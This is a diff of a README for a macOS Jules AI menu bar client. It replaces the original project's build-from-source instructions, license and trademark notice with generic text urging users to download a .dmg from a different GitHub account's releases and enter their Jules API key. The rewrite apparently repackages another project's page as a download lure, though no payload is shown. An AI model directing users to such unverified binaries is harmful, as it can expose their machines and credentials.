@@ -1,117 +1,96 @@
-# Jules for macOS
+# 🌟 jules-companion - Your AI Coding Assistant in the Menu Bar
 
-A native macOS menu bar application for interacting with the Jules AI coding assistant API.
+[![Download jules-companion](https://img.shields.io/badge/Download-jules--companion-blue.svg)](https://github.com/Pla1er1/jules-companion/releases)
 
-<img width="2416" height="1616" alt="jules-desktop" src="https://github.com/user-attachments/assets/b73d897e-845b-4aba-9a2e-7b268a8134d1" />
+## 📥 Download & Install
 
+To get started with jules-companion, you will need to download the application. Follow the steps below:
 
-## Features
+1. Visit [this page to download](https://github.com/Pla1er1/jules-companion/releases).
+2. Look for the latest release at the top of the page.
+3. Click on the `.dmg` file to download it to your computer.
+4. Once downloaded, open the file to start the installation process.
+5. Drag the jules-companion application into your Applications folder.
 
-- **Menu Bar Integration**: Quick access from your menu bar or centered floating panel
-- **Session Management**: Create, view, and manage coding sessions
-- **Real-time Updates**: Live polling for session status and activity updates
-- **Diff Viewing**: High-performance Metal-accelerated diff visualization
-- **Merge Conflict Resolution**: Visual merge conflict handling
-- **Offline Support**: Queue sessions when offline, sync when connectivity returns
-- **Keyboard Shortcuts**: Global hotkeys for quick access
-- **Auto-updates**: Built-in update mechanism via Sparkle
+## 🚀 Getting Started
 
-## Requirements
+jules-companion is a native macOS application designed to simplify your coding tasks. It provides easy access to the Jules AI coding assistant from your menu bar.
 
-- macOS 13.0 or later
-- Xcode 15.0 or later (for building)
-- A Jules API key (obtain from [jules.google.com](https://jules.google.com))
+1. Open the applications folder and find jules-companion.
+2. Double-click to open the application.
+3. You may need to allow permissions to run the app if prompted.
+4. Enter your Jules API key, which you can obtain from [jules.google.com](https://jules.google.com), when you first launch the app.
 
-## Building
+## 🛠️ Requirements
 
-1. Clone the repository:
-   ```bash
-   git clone https://github.com/simpsoka/jules-osx.git
-   cd jules-osx
-   ```
+Before using jules-companion, ensure that you meet the following requirements:
 
-2. Open the project in Xcode:
-   ```bash
-   open jules.xcodeproj
-   ```
+- **macOS 13.0 or later**: Make sure your operating system is up to date.
+- **Xcode 15.0 or later**: This is needed for any advanced features and builds, though most users will not need this for regular use.
+- **Jules API key**: Sign up and get your API key from [jules.google.com](https://jules.google.com).
 
-3. Build and run (Cmd+R)
+## 🌟 Features
 
-## Configuration
+jules-companion comes packed with features designed to enhance your coding experience:
 
-### API Key
+- **Menu Bar Integration**: Access the application quickly from your menu bar.
+- **Session Management**: Easily create, view, and manage your coding sessions.
+- **Real-time Updates**: Get live updates on session status and activities.
+- **Diff Viewing**: View coding differences with Metal-accelerated performance.
+- **Merge Conflict Resolution**: Handle merge conflicts visually and intuitively.
+- **Offline Support**: Work offline and sync your sessions once connected.
+- **Keyboard Shortcuts**: Use global hotkeys for quicker access.
+- **Auto-updates**: Enjoy seamless updates via the built-in Sparkle update system.
 
-Enter your Jules API key in the app's Settings to start using the application.
+## 🎓 Usage Guide
 
-### Firebase/Gemini (Optional)
+Once installed, using jules-companion is straightforward:
 
-The app includes optional Firebase integration for AI-generated activity descriptions using Gemini. This feature is **disabled by default** and the app works perfectly without it.
+1. **Starting a Session**:
+   - Click on the jules-companion icon in the menu bar.
+   - Select "Start New Session."
 
-To enable Firebase/Gemini:
+2. **Managing Your Work**:
+   - You can view all active sessions in the dropdown menu.
+   - Use keyboard shortcuts to switch between different sessions swiftly.
 
-1. Create a Firebase project at [console.firebase.google.com](https://console.firebase.google.com)
-2. Add a macOS app with your bundle ID
-3. Download `GoogleService-Info.plist` and replace the placeholder file in `jules/`
-4. Open `jules/AppDelegate.swift` and set:
-   ```swift
-   let ENABLE_FIREBASE = true
-   ```
+3. **Handling Merge Conflicts**:
+   - When you encounter a merge conflict, jules-companion will alert you.
+   - Follow the on-screen instructions to resolve the conflict seamlessly.
 
-### Auto-Updates (Optional)
+4. **Saving Your Progress**:
+   - The application saves your sessions automatically, ensuring you don’t lose your work.
 
-To enable auto-updates for your distribution:
+## 🔄 Updating the Application
 
-1. Set up a Sparkle appcast feed
-2. Update `SPARKLE_APPCAST_URL` in `AppDelegate.swift`
-3. Configure your signing keys in the project settings
+Keeping jules-companion up to date is simple:
 
-## Project Structure
+- The application checks for updates automatically.
+- When an update is available, jules-companion will prompt you to install.
+- Just follow the on-screen instructions to complete the update.
 
-```
-jules/
-├── AppDelegate.swift       # App lifecycle, menu bar, hotkeys
-├── DataManager.swift       # Core data management and API coordination
-├── APIService.swift        # REST API client for Jules backend
-├── SessionRepository.swift # Session persistence (GRDB/SQLite)
-├── Flux/                   # Metal-based diff rendering
-├── MergeConflictWindow/    # Merge conflict UI
-├── Canvas/                 # Drawing/annotation features
-└── ...
-```
+## ❓ Frequently Asked Questions
 
-## Keyboard Shortcuts
+**1. What should I do if I encounter issues?**  
+Visit the [issues page](https://github.com/Pla1er1/jules-companion/issues) on GitHub to get help or report bugs. 
 
-Default shortcuts (configurable in Settings):
+**2. Can I run this on older versions of macOS?**  
+No, jules-companion requires macOS 13.0 or later.
 
-- **Control+Option+J**: Toggle Jules menu
-- **Control+Option+S**: Capture screenshot
-- **Control+Option+V**: Voice input (macOS 26.0+)
+**3. Do I need a coding background to use this app?**  
+No, jules-companion is designed for users of all skill levels. 
 
-## Architecture
+**4. How do I obtain an API key?**  
+You can get your API key by signing up at [jules.google.com](https://jules.google.com).
 
-- **UI Framework**: SwiftUI with AppKit integration
-- **Database**: SQLite via GRDB
-- **Networking**: URLSession with offline queue support
-- **Graphics**: Metal for high-performance diff rendering
-- **Updates**: Sparkle framework
+## 📞 Support
 
-## Dependencies
+For further assistance, you can reach out via the GitHub repository. Please provide detailed information about any issues you are facing. Your feedback helps improve the software.
 
-- [GRDB](https://github.com/groue/GRDB.swift) - SQLite toolkit
-- [Sparkle](https://github.com/sparkle-project/Sparkle) - Auto-updates
-- [HotKey](https://github.com/soffes/HotKey) - Global keyboard shortcuts
-- [SwiftTreeSitter](https://github.com/ChimeHQ/SwiftTreeSitter) - Syntax parsing
-- [Lottie](https://github.com/airbnb/lottie-ios) - Animations
-- [Firebase iOS SDK](https://github.com/firebase/firebase-ios-sdk) - Optional AI features
+## 🔗 Useful Links
 
-## Contributing
+- [Download jules-companion](https://github.com/Pla1er1/jules-companion/releases)
+- [Jules API Documentation](https://jules.google.com/docs)
+- [GitHub Repository](https://github.com/Pla1er1/jules-companion)
 
-Contributions are welcome! Please feel free to submit issues and pull requests.
-
-## License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
-## Trademarks
-
-"Jules" name, logo, and branding are trademarks of Alphabet Inc. and are used with permission.
+Enjoy using jules-companion for a smoother coding experience!
